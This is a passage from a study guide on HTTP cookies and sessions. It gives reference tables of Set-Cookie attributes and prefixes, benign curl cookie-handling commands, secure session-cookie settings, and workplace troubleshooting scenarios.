
---

## Quick Reference Card

### `Set-Cookie` attributes

| Attribute | Value? | What it does | Set it when |
|-----------|--------|--------------|-------------|
| `Name=Value` | required | The stored data (opaque session ID for sessions) | always |
| `Expires=<date>` | yes | Absolute delete time (clock-dependent) | rarely; prefer Max-Age |
| `Max-Age=<secs>` | yes | Relative lifetime in seconds; `0` = delete | persistent cookies |
| (neither) | — | Session cookie — dies on browser close | "log out on close" |
| `Domain=<host>` | yes | Broadens to host + all subdomains | cross-subdomain sharing only |
| (no Domain) | — | Host-only — exact host, no subdomains | default; safest |
| `Path=<path>` | yes | Restrict to path prefix | scoping, not security |
| `Secure` | flag | HTTPS-only transmission | always for sensitive cookies |
| `HttpOnly` | flag | Hidden from JavaScript (XSS defense) | always for session cookies |
| `SameSite=Strict` | — | Never cross-site | max CSRF protection |
| `SameSite=Lax` | — | Cross-site top-level GET only (default) | most session cookies |
| `SameSite=None` | — | All cross-site — **requires `Secure`** | third-party / cross-site API |

### Name prefixes

| Prefix | Browser enforces | Use for |
|--------|------------------|---------|
| `__Secure-` | `Secure` + set over HTTPS | any HTTPS-only cookie |
| `__Host-` | `Secure` + HTTPS + `Path=/` + **no** `Domain` | session cookies (strongest lock) |

### Limits

| Limit | Value (typical) |
|-------|-----------------|
| Max size per cookie | ~4 KB (name+value+attributes) |
| Max cookies per domain | ~50 |
| Max cookies total | ~180 |
| Sent on every request? | **Yes** — keep them small |

### Cookie vs Session vs JWT

| | Cookie | Server session | Stateless JWT |
|---|--------|----------------|---------------|
| Where state lives | browser | server store (Redis/DB) | inside the token |
| Cookie carries | anything small | opaque random ID | signed claims |
| Revoke instantly? | n/a | yes (delete from store) | hard (needs blocklist) |
| Scales without shared store? | n/a | no | yes |
| See | this topic | this topic | Topic 16 |

### Cheat block

```bash
# --- curl cookie handling ---
curl -c jar.txt URL              # save received cookies
curl -b jar.txt URL              # send saved cookies
curl -b jar.txt -c jar.txt URL   # send old + save new (a "session")
curl -b "sid=abc; k=v" URL       # send inline cookies (wire format)
curl -v URL | grep -i cookie     # inspect Set-Cookie (<) and Cookie (>)

# --- the golden session cookie ---
Set-Cookie: __Host-sid=<256-bit-random>; Path=/; Secure; HttpOnly; SameSite=Lax

# --- delete a cookie (must match Name+Path+Domain) ---
Set-Cookie: __Host-sid=; Path=/; Secure; HttpOnly; Max-Age=0

# --- the round trip ---
response:  Set-Cookie: name=value; <attributes>     (one header per cookie)
request:   Cookie: name1=v1; name2=v2; name3=v3      (one header, no attributes)

# --- browser sends a cookie ONLY IF all match ---
Domain ✓  Path ✓  Secure-satisfied ✓  not-expired ✓  SameSite-allows ✓
(HttpOnly does NOT affect sending — only JS read access)
```

---

## When Would I Use This at Work?

### Scenario 1: "Users get logged out randomly since we scaled up"
You immediately suspect the session **store**, not the cookie. In-memory sessions on multiple instances mean a request handled by a different instance than the one that logged the user in finds no session → 401. You reach for a shared Redis store (or sticky sessions as a stopgap), exactly as in Example 2. You confirm with `curl -v` that the cookie *is* being sent correctly, which rules out the cookie and points at the store.

### Scenario 2: "Login works locally but not in production"
You know the usual suspects cold: `Secure` cookie withheld over an HTTP hop behind the TLS-terminating proxy (`trust proxy`), `SameSite` blocking a cross-site fetch, `Domain`/origin mismatch, or `fetch` missing `credentials: "include"`. You capture `Set-Cookie` and `Cookie` with `curl -v` and DevTools ▸ Application ▸ Cookies, and fix the specific attribute that's wrong instead of guessing.

### Scenario 3: "Security review flagged our auth cookies"
You audit every session cookie for `HttpOnly` (XSS can't steal it), `Secure` (never plaintext), `SameSite` (CSRF defense), tight `Domain` scope, and the `__Host-` prefix. You verify the app regenerates the session ID on login (fixation) and destroys it server-side on logout. You move any bulky data out of cookies and into the session store.

### Scenario 4: "Our API responses are slow and requests are huge"
You check request sizes and find a fat cookie being uploaded on every call. You replace stuffed cookies with a small opaque session ID pointing at Redis, cutting per-request overhead across every endpoint and asset.

---

## Connected Topics

**Study before this:**
- `14-http-headers-in-depth.md` — `Set-Cookie` and `Cookie` are just headers; know how headers work first
- `16-authentication-over-http.md` — cookies vs Bearer tokens vs JWT; sessions are one auth strategy among several
- `01-how-the-internet-works.md` — why HTTP is stateless in the first place

**Study next / alongside:**
- `17-cors-in-depth.md` — cross-origin credentialed requests, `Access-Control-Allow-Credentials`, and why `fetch` needs `credentials: "include"`
- `28-load-balancers.md` — sticky sessions vs shared session stores; the exact scaling problem in Example 2
- `29-reverse-proxies.md` — `X-Forwarded-Proto` and `trust proxy`, the reason `Secure` cookies break behind a TLS-terminating proxy
- `09-tls-ssl-in-depth.md` — what `Secure` actually depends on; why plaintext cookies are readable on the path

**The core idea to carry forward:** a cookie is a client-side sticky note the browser resends automatically; a session is that note (a random ID) plus a server-side store that holds the real state. Every security attribute — `HttpOnly`, `Secure`, `SameSite`, `__Host-` — exists because the browser sends cookies automatically and an attacker will try to make that automation work for them.

---

*Doc saved: `/docs/networking/19-cookies-and-sessions.md`*
